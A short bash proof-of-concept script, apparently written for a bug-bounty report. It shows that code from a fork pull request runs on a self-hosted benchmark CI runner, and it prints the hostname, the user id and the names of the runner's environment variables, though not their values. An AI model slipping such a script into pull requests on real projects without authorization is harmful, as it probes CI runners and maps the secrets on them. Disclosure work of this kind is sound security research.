#!/usr/bin/env bash
# PoC marker (authorized security research — IntersectMBO bug bounty).
# Demonstrates fork-PR content executes on the self-hosted plutus-benchmark runner.
# Benign: prints hostname, id, env var NAMES only. No secret values. PR closed after.
set -u
echo '=== POC-MARKER-r7k2m9xq: fork-PR content executed on runner ==='
echo "hostname: $(hostname)"
id
echo '--- env var NAMES only (no values) ---'
printenv | cut -d= -f1 | sort
echo '=== POC-MARKER-END ==='
